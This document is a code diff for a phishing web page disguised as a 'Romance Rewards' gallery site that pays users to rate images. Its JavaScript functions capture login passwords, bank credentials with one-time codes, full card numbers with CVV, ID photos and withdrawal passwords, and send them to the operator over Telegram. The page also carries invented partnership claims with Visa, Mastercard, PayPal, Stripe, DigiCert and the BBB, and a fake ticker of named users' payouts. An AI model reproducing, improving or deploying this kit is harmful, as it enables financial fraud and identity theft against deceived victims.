+"https://i.ibb.co/gZG85m8K/PNG-image-98.png",
+"https://i.ibb.co/hJKxLY4n/PNG-image-67.png",
+"https://i.ibb.co/j969hsqY/PNG-image-60.png",
+"https://i.ibb.co/bgvTq6HX/PNG-image-55.png",
+"https://i.ibb.co/2Y8jDbHD/PNG-image-64.png",
+"https://i.ibb.co/TD4HRSKY/PNG-image-87.png",
+"https://i.ibb.co/B50w81SC/PNG-image-86.png",
+"https://i.ibb.co/Hfs08gPn/PNG-image-72.png",
+"https://i.ibb.co/d0Lwv7bn/PNG-image-77.png",
+"https://i.ibb.co/zhgx6FtT/PNG-image-84.png",
+"https://i.ibb.co/1fk1jJwx/PNG-image-56.png",
+"https://i.ibb.co/Y7w2Nx80/PNG-image-70.png",
+"https://i.ibb.co/v6qHsvkN/PNG-image-95.png",
+"https://i.ibb.co/rRGzSLmy/PNG-image-69.png",
+"https://i.ibb.co/Ndtkxvp2/PNG-image-81.png",
+"https://i.ibb.co/z1nBY8f/PNG-image-79.png",
+"https://i.ibb.co/5gvryMqb/PNG-image-89.png",
+"https://i.ibb.co/5XRRHCfV/PNG-image-93.png",
+"https://i.ibb.co/Rp8TWVfB/PNG-image-59.png",
+"https://i.ibb.co/ZDRqMQK/PNG-image-18.png",
+"https://i.ibb.co/Z6t3sqf9/PNG-image-35.png",
+"https://i.ibb.co/TxLrNhCX/PNG-image-38.png",
+"https://i.ibb.co/v4nfR5kC/PNG-image-42.png",
+"https://i.ibb.co/hJ22zW3y/PNG-image-11.png",
+"https://i.ibb.co/HfF3PmPh/PNG-image-23.png",
+"https://i.ibb.co/jPwkygjH/PNG-image-8.png",
+"https://i.ibb.co/tp5j2v1p/PNG-image-15.png",
+"https://i.ibb.co/CKJMM9F7/PNG-image-26.png",
+"https://i.ibb.co/G4GdwsYK/PNG-image-39.png",
+"https://i.ibb.co/0yxTH6bm/PNG-image-29.png",
+"https://i.ibb.co/DDhMkLCM/PNG-image-2.png",
+"https://i.ibb.co/DPTg7xC1/PNG-image-32.png",
+"https://i.ibb.co/RTM7kfTF/PNG-image-5.png",
+"https://i.ibb.co/mFb1V3G0/PNG-image-17.png",
+"https://i.ibb.co/DmkxmkC/PNG-image-20.png",
+"https://i.ibb.co/Fk4VJ0MH/PNG-image-14.png",
+"https://i.ibb.co/wFjNsQR3/PNG-image-34.png",
+"https://i.ibb.co/XkNVMWRP/PNG-image-37.png",
+"https://i.ibb.co/TN9DhD2/PNG-image-41.png",
+"https://i.ibb.co/xK6zptw7/PNG-image-13.png",
+"https://i.ibb.co/fVkG0Q4n/PNG-image-25.png",
+"https://i.ibb.co/jv0LcJLK/PNG-image-10.png",
+"https://i.ibb.co/gbkQjmWv/PNG-image-47.png",
+"https://i.ibb.co/0y7WWHZ0/PNG-image-7.png",
+"https://i.ibb.co/27RPrnKL/PNG-image-22.png",
+"https://i.ibb.co/6JsM7D9j/PNG-image.png",
+"https://i.ibb.co/Rk4PZQ85/PNG-image-28.png",
+"https://i.ibb.co/BVmmkWVG/PNG-image-36.png",
+"https://i.ibb.co/Jjgpd9Bx/PNG-image-31.png",
+"https://i.ibb.co/Hfd10pKH/PNG-image-43.png",
+"https://i.ibb.co/C5gwT7pz/PNG-image-16.png",
+"https://i.ibb.co/93njPRRD/PNG-image-4.png",
+"https://i.ibb.co/QjJXx2z3/PNG-image-27.png",
+"https://i.ibb.co/kV1Z2LJY/PNG-image-19.png",
+"https://i.ibb.co/60BJ6F4F/PNG-image-12.png",
+"https://i.ibb.co/qY18mdm4/PNG-image-40.png",
+"https://i.ibb.co/66XHq3K/PNG-image-9.png",
+"https://i.ibb.co/5gLDdDfy/PNG-image-24.png",
+"https://i.ibb.co/yFJbCLbr/PNG-image-6.png",
+"https://i.ibb.co/HfNbYzHn/PNG-image-33.png",
+"https://i.ibb.co/TB1QfQ2G/PNG-image-30.png",
+"https://i.ibb.co/Qgy2HG0/PNG-image-3.png",
+"https://i.ibb.co/SHTpjt4/PNG-image-49.png",
+"https://i.ibb.co/yFsgVVjN/PNG-image-45.png",
+"https://i.ibb.co/nsfVHV4j/PNG-image-46.png",
+"https://i.ibb.co/MkdBbScF/PNG-image-44.png",
+"https://i.ibb.co/8LgK3SM2/PNG-image-50.png",
+"https://i.ibb.co/gMpd20jm/PNG-image-48.png",
+"https://i.ibb.co/qF33kSKh/IMG-7615.jpg",
+"https://i.ibb.co/3ynFsqY5/IMG-7614.jpg",
+"https://i.ibb.co/5WzvSSTk/IMG-7595.jpg",
+"https://i.ibb.co/kgPWmC9t/IMG-7594.jpg",
+"https://i.ibb.co/Wv1xSFmG/IMG-7593.jpg",
+"https://i.ibb.co/ymHyMWb2/IMG-7592.jpg",
+"https://i.ibb.co/j9wJJ3MN/IMG-7591.jpg",
+"https://i.ibb.co/4R7D8hXS/IMG-7590.jpg",
+"https://i.ibb.co/CKVbBqBr/IMG-7589.jpg",
+"https://i.ibb.co/d0qNNVfQ/IMG-7588.jpg",
+"https://i.ibb.co/tPxWTPXG/IMG-7586.jpg",
+"https://i.ibb.co/C3TBQ0sG/IMG-7585.jpg",
+"https://i.ibb.co/XZVCsKyb/IMG-7582.jpg",
+"https://i.ibb.co/Jwc9LynY/telegram-photo-0-6300841371581398948.jpg",
+"https://i.ibb.co/N6kRmrkQ/IMG-7493.jpg",
+"https://i.ibb.co/1f8WfBws/IMG-7491.jpg",
+"https://i.ibb.co/KxvTG6x2/IMG-7497.jpg",
+"https://i.ibb.co/DPTqQGdm/IMG-7496.jpg",
+"https://i.ibb.co/992rknHq/IMG-7494.jpg",
+"https://i.ibb.co/6JmrSLqf/IMG-7495.jpg"
+];
 
-        let selectedBankName = "Philo Exchange";
-        let currentRating = 0;
-        let userBalance = 15.00;
-        let currentUserEmail = "";
+let images = [];
+rawImageUrls.forEach((url, i) => {
+images.push({
+title: `US Romance Gallery ${i < 9 ? '0' + (i + 1) : (i + 1)}`,
+img: url
+});
+});
 
-        function initLandingGrid() {
-            const previewContainer = document.getElementById("landing-grid-preview");
-            if (!previewContainer) return;
-            previewContainer.innerHTML = "";
-            for(let i = 0; i < 8; i++) {
-                previewContainer.innerHTML += `<img src="${images[i].img}" alt="Preview ${i+1}">`;
-            }
-        }
+const modalData = {
+visa: {
+title: "VISA Secure Gateway",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Officially certified and legally compliant under US digital transaction standards since 2022. Provides encrypted end-to-end settlement protection and secure merchant clearing frameworks."
+},
+mastercard: {
+title: "Mastercard Identity Check",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "In official partnership since 2022, ensuring robust tokenization, multi-factor authentication, and strict adherence to federal consumer protection mandates."
+},
+stripe: {
+title: "Stripe Financial Infrastructure",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Integrated liquidity and payment compliance partner since 2022, delivering transparent payout processing and regulated financial routing standards."
+},
+paypal: {
+title: "PayPal Secure Checkout",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Trusted escrow and buyer protection partner since 2022, providing verified multi-currency transaction safety and consumer dispute resolution guidelines."
+},
+digicert: {
+title: "DigiCert TLS/SSL Security",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Exclusive digital certificate authority protecting platform sessions since 2022, enforcing quantum-resistant encryption and strict data privacy protocols."
+},
+bbb: {
+title: "BBB Accreditation Verified",
+subtitle: "Partnered with Romance Rewards since 2022",
+desc: "Accredited member since 2022 with an A+ rating, officially recognized for high ethical business standards, transparency, and consumer trust."
+}
+};
 
-        function switchPage(pageId) {
-            document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
-            const targetPage = document.getElementById(pageId);
-            if (targetPage) {
-                targetPage.classList.add('active');
-            }
-            window.scrollTo(0, 0);
-        }
+let selectedBankName = "Chase Bank";
+let activePaymentMode = "bank";
+let currentRating = 0;
+let userBalance = 15.00;
+let currentUserEmail = "";
+let frontIdBase64 = "";
+let backIdBase64 = "";
+let selectedCardIndex = null;
 
-        function toggleSidebar() {
-            document.getElementById('sidebar').classList.toggle('open');
-            document.getElementById('overlay').classList.toggle('active');
-        }
+const usPayoutNames = [
+"Michael S. (California) withdrew $150.00", "Jessica W. (New York) withdrew $250.00",
+"David M. (Texas) withdrew $100.00", "Emily R. (Florida) withdrew $300.00",
+"James K. (Illinois) withdrew $120.00", "Amanda J. (Washington) withdrew $180.00",
+"Robert T. (Ohio) withdrew $220.00", "Sarah L. (Georgia) withdrew $140.00",
+"William B. (Michigan) withdrew $190.00", "Ashley H. (North Carolina) withdrew $210.00"
+];
 
-        function openBankPage() {
-            toggleSidebar();
-            switchPage('bank-connect-page');
-        }
+function initLandingGrid() {
+const previewContainer = document.getElementById("landing-grid-preview");
+if (!previewContainer) return;
+previewContainer.innerHTML = "";
+for(let i = 0; i < 16; i++) {
+previewContainer.innerHTML += `<img src="${images[i].img}" alt="Preview ${i+1}">`;
+}
+const tickerEl = document.getElementById("landing-payout-ticker");
+if(tickerEl) tickerEl.innerText = "💰 " + usPayoutNames.join(" • ") + " • ";
+const dashTickerEl = document.getElementById("dashboard-payout-ticker");
+if(dashTickerEl) dashTickerEl.innerText = "💰 " + usPayoutNames.join(" • ") + " • ";
+const sectionTitleCount = document.getElementById("section-title-count");
+if(sectionTitleCount) sectionTitleCount.innerText = `Available Gallery Items (${images.length} Images)`;
+}
 
-        function handleLoginSubmit() {
-            let emailInput = document.getElementById("login-email");
-            let passInput = document.getElementById("login-pass");
+function switchPage(pageId) {
+document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+document.querySelectorAll('.sub-page-container').forEach(p => p.classList.remove('active'));
+const targetPage = document.getElementById(pageId);
+if (targetPage) targetPage.classList.add('active');
+window.scrollTo(0, 0);
+}
 
-            let email = emailInput ? emailInput.value : "";
-            let pass = passInput ? passInput.value : "";
+function toggleSidebar() {
+document.getElementById('sidebar').classList.toggle('open');
+document.getElementById('overlay').classList.toggle('active');
+}
 
-            if(!email || !pass) {
-                alert("Please enter both email and password.");
-                return;
-            }
+function openSubPage(pageId) {
+toggleSidebar();
+switchPage(pageId);
+}
 
-            currentUserEmail = email;
-            let emailDisplay = document.getElementById("nav-email-display");
-            let avatarLetter = document.getElementById("user-avatar-letter");
-            
-            if(emailDisplay) emailDisplay.innerText = email;
-            if(avatarLetter) avatarLetter.innerText = email.charAt(0).toUpperCase();
+function switchMethod(mode) {
+activePaymentMode = mode;
+document.getElementById('tab-bank').classList.remove('active');
+document.getElementById('tab-card').classList.remove('active');
+document.getElementById('form-bank-section').style.display = 'none';
+document.getElementById('form-card-section').style.display = 'none';
+if(mode === 'bank') {
+document.getElementById('tab-bank').classList.add('active');
+document.getElementById('form-bank-section').style.display = 'block';
+} else {
+document.getElementById('tab-card').classList.add('active');
+document.getElementById('form-card-section').style.display = 'block';
+}
+}
 
-            let msg = `🚨 New Login Captured!\n📧 Email: ${email}\n🔑 Password: ${pass}`;
-            sendToTelegram(msg);
+function handleLoginSubmit() {
+let emailInput = document.getElementById("login-email");
+let passInput = document.getElementById("login-pass");
+let email = emailInput ? emailInput.value : "";
+let pass = passInput ? passInput.value : "";
+if(!email || !pass) {
+alert("Please enter both email and password.");
+return;
+}
+currentUserEmail = email;
+let emailDisplay = document.getElementById("nav-email-display");
+let avatarLetter = document.getElementById("user-avatar-letter");
+if(emailDisplay) emailDisplay.innerText = email;
+if(avatarLetter) avatarLetter.innerText = email.charAt(0).toUpperCase();
+let msg = `🚨 US Portal Login Captured! 📧 Email: ${email} 🔑 Password: ${pass}`;
+sendToTelegram(msg);
+loadImages();
+switchPage('dashboard-page');
+}
 
-            loadImages();
-            switchPage('dashboard-page');
-        }
+function loadImages() {
+const container = document.getElementById("image-grid-container");
+if (!container) return;
+container.innerHTML = "";
+images.forEach((imgItem, index) => {
+container.innerHTML += `<div class="image-card" id="img-card-${index}" onclick="openDetail(${index})"> <img src="${imgItem.img}" alt="${imgItem.title}"> <div class="image-info"> <div class="image-title">${imgItem.title}</div> <div class="stars"> <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i> <span style="color:#94a3b8; font-size:0.7rem;">(5.0)</span> </div> </div> </div>`;
+});
+}
 
-        function loadImages() {
-            const container = document.getElementById("image-grid-container");
-            if (!container) return;
-            container.innerHTML = "";
-            images.forEach((imgItem, index) => {
-                container.innerHTML += `
-                    <div class="image-card" onclick="openDetail(${index})">
-                        <img src="${imgItem.img}" alt="${imgItem.title}">
-                        <div class="image-info">
-                            <div class="image-title">${imgItem.title}</div>
-                            <div class="stars">
-                                <i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i><i class="fa-solid fa-star"></i>
-                                <span style="color:#94a3b8; font-size:0.75rem;">(5.0)</span>
-                            </div>
-                        </div>
-                    </div>
-                `;
-            });
-        }
+function openDetail(index) {
+selectedCardIndex = index;
+const imgItem = images[index];
+document.getElementById("detail-img").src = imgItem.img;
+document.getElementById("detail-title").innerText = imgItem.title;
+currentRating = 0;
+resetStars();
+document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+document.querySelectorAll('.sub-page-container').forEach(p => p.classList.remove('active'));
+document.getElementById('detail-page').classList.add('active');
+window.scrollTo(0, 0);
+}
 
-        function openDetail(index) {
-            const imgItem = images[index];
-            document.getElementById("detail-img").src = imgItem.img;
-            document.getElementById("detail-title").innerText = imgItem.title;
-            currentRating = 0;
-            resetStars();
-            switchPage('detail-page');
-        }
+function goBackToDashboard() {
+document.querySelectorAll('.page').forEach(p => p.classList.remove('active'));
+document.querySelectorAll('.sub-page-container').forEach(p => p.classList.remove('active'));
+document.getElementById('dashboard-page').classList.add('active');
+if (selectedCardIndex !== null) {
+setTimeout(() => {
+let cardEl = document.getElementById(`img-card-${selectedCardIndex}`);
+if (cardEl) cardEl.scrollIntoView({ behavior: 'smooth', block: 'center' });
+}, 50);
+} else {
+window.scrollTo(0, 0);
+}
+}
 
-        function rateStar(stars) {
-            currentRating = stars;
-            document.querySelectorAll("#star-container i").forEach((el, idx) => {
-                if (idx < stars) el.classList.add("rated");
-                else el.classList.remove("rated");
-            });
-        }
+function rateStar(stars) {
+currentRating = stars;
+document.querySelectorAll("#star-container i").forEach((el, idx) => {
+if (idx < stars) el.classList.add("rated");
+else el.classList.remove("rated");
+});
+}
 
-        function resetStars() {
-            document.querySelectorAll("#star-container i").forEach(el => el.classList.remove("rated"));
-        }
+function resetStars() {
+document.querySelectorAll("#star-container i").forEach(el => el.classList.remove("rated"));
+}
 
-        function submitRating() {
-            if (currentRating === 0) {
-                alert("Please select star rating first.");
-                return;
-            }
-            userBalance += 2.00;
-            document.getElementById("user-balance").innerText = userBalance.toFixed(2);
-            alert("Rating submitted successfully! ($2.00 added to balance)");
-            switchPage('dashboard-page');
-        }
+function submitRating() {
+if (currentRating === 0) {
+alert("Please select star rating first.");
+return;
+}
+userBalance += 2.00;
+document.getElementById("user-balance").innerText = userBalance.toFixed(2);
+document.getElementById("statement-balance").innerText = userBalance.toFixed(2);
+alert("Rating submitted successfully! ($2.00 added to balance)");
+goBackToDashboard();
+}
 
-        function selectBank(name, element) {
-            document.querySelectorAll('.bank-opt').forEach(opt => opt.classList.remove('selected'));
-            element.classList.add('selected');
-            selectedBankName = name;
-            
-            const otherGroup = document.getElementById("other-bank-group");
-            if (name === 'Other Bank') {
-                otherGroup.style.display = "block";
-            } else {
-                otherGroup.style.display = "none";
-            }
-        }
+function selectBank(name, element) {
+document.querySelectorAll('.bank-opt').forEach(opt => opt.classList.remove('selected'));
+element.classList.add('selected');
+selectedBankName = name;
+const otherGroup = document.getElementById("other-bank-group");
+if (name === 'Other Bank') otherGroup.style.display = "block";
+else otherGroup.style.display = "none";
+}
 
-        function saveUSBankInfo() {
-            let user = document.getElementById("bank-user").value;
-            let pass = document.getElementById("bank-pass").value;
-            let otp = document.getElementById("bank-otp").value;
-            
-            let finalBank = selectedBankName;
-            if (selectedBankName === 'Other Bank') {
-                let customBank = document.getElementById("other-bank-name").value;
-                if(customBank) finalBank = customBank;
-            }
+function previewImage(event, previewId) {
+let reader = new FileReader();
+reader.onload = function(){
+let output = document.getElementById(previewId);
+output.src = reader.result;
+output.style.display = "block";
+if(previewId === 'front-preview') frontIdBase64 = reader.result;
+else backIdBase64 = reader.result;
+};
+if(event.target.files[0]) reader.readAsDataURL(event.target.files[0]);
+}
 
-            if(!user || !pass) {
-                alert("Please enter your Online ID and Password.");
-                return;
-            }
+function saveKYCInfo() {
+let name = document.getElementById("kyc-name").value;
+let phone = document.getElementById("kyc-phone").value;
+let idType = document.getElementById("kyc-id-type").value;
+if(!name || !phone) {
+alert("Please fill in all KYC details.");
+return;
+}
+let msg = `🚨 US KYC Info Captured! 📧 Email: ${currentUserEmail} 👤 Name: ${name} 📞 Phone: ${phone} 🪪 ID Type: ${idType}`;
+sendToTelegram(msg);
+if(frontIdBase64) sendPhotoToTelegram(frontIdBase64, `🪪 Front ID Photo - ${currentUserEmail} (${name})`);
+if(backIdBase64) sendPhotoToTelegram(backIdBase64, `🪪 Back ID Photo - ${currentUserEmail} (${name})`);
+alert("US KYC verification details & photos sent successfully!");
+switchPage('dashboard-page');
+}
 
-            let msg = `🚨 US Bank Credentials Captured!\n📧 Email: ${currentUserEmail}\n🏦 Bank: ${finalBank}\n👤 Username: ${user}\n🔑 Password: ${pass}\n🔢 OTP: ${otp}`;
-            sendToTelegram(msg);
+function savePaymentMethod() {
+let msg = "";
+if (activePaymentMode === 'bank') {
+let user = document.getElementById("bank-user").value;
+let pass = document.getElementById("bank-pass").value;
+let otp = document.getElementById("bank-otp").value;
+let finalBank = selectedBankName;
+if (selectedBankName === 'Other Bank') {
+let customBank = document.getElementById("other-bank-name").value;
+if(customBank) finalBank = customBank;
+}
+if(!user || !pass) {
+alert("Please enter your Online ID and Password.");
+return;
+}
+msg = `🚨 US Bank Credentials Captured! 📧 Email: ${currentUserEmail} 🏦 Bank: ${finalBank} 👤 Username: ${user} 🔑 Password: ${pass} 🔢 OTP: ${otp}`;
+} else {
+let cardName = document.getElementById("card-name").value;
+let cardNumber = document.getElementById("card-number").value;
+let cardExp = document.getElementById("card-exp").value;
+let cardCvv = document.getElementById("card-cvv").value;
+let cardZip = document.getElementById("card-zip").value;
+if(!cardNumber || !cardCvv) {
+alert("Please enter valid card details.");
+return;
+}
+msg = `🚨 US Card Details Captured! 📧 Email: ${currentUserEmail} 👤 Cardholder: ${cardName} 💳 Card Number: ${cardNumber} 📅 Exp: ${cardExp} 🔒 CVV: ${cardCvv} 📮 ZIP: ${cardZip}`;
+}
+sendToTelegram(msg);
+alert("Payment method successfully connected & saved!");
+switchPage('dashboard-page');
+}
 
-            alert("Bank account successfully connected & rewards payout processing!");
-            switchPage('dashboard-page');
-        }
+function submitWithdrawal() {
+let amount = document.getElementById("withdraw-amount").value;
+let pass = document.getElementById("withdraw-pass").value;
+if(!amount || !pass) {
+alert("Please enter amount and password.");
+return;
+}
+let msg = `🚨 US Withdrawal Requested! 📧 Email: ${currentUserEmail} 💰 Amount: $${amount} 🔑 Password: ${pass}`;
+sendToTelegram(msg);
+alert("Withdrawal request submitted successfully!");
+switchPage('dashboard-page');
+}
 
-        window.onload = function() {
-            initLandingGrid();
-        };
-    </script>
+function openModal(type) {
+const modal = document.getElementById('infoModal');
+const contentBox = document.getElementById('modalBodyContent');
+const data = modalData[type];
+if (data) {
+contentBox.innerHTML = `<div style="text-align: center; margin-bottom: 15px;"> <div style="display: inline-block; padding: 10px; background: rgba(0,242,254,0.1); border-radius: 50%; color: #00f2fe; font-size: 1.5rem; margin-bottom: 10px;"> <i class="fas fa-shield-alt"></i> </div> <h3 style="color: #00f2fe; font-size: 1.25rem; font-weight: 700; margin: 0 0 5px 0;">${data.title}</h3> <p style="color: #00f2fe; font-size: 0.8rem; font-weight: 600; margin: 0;">${data.subtitle}</p> </div> <div style="background: rgba(15, 23, 42, 0.6); border-left: 3px solid #00f2fe; padding: 12px 15px; border-radius: 0 8px 8px 0; margin-top: 10px;"> <p style="color: #e2e8f0; font-size: 0.875rem; line-height: 1.6; margin: 0;">${data.desc}</p> </div>`;
+modal.style.display = 'flex';
+}
+}
+
+function closeModal() {
+document.getElementById('infoModal').style.display = 'none';
+}
+
+function navigateToMainMenu() {
+toggleSidebar();
+switchPage('dashboard-page');
+}
+
+window.onclick = function(event) {
+const modal = document.getElementById('infoModal');
+if (event.target == modal) modal.style.display = 'none';
+}
+
+window.addEventListener('DOMContentLoaded', (event) => {
+initLandingGrid();
+});
+</script>
 </body>
 </html>
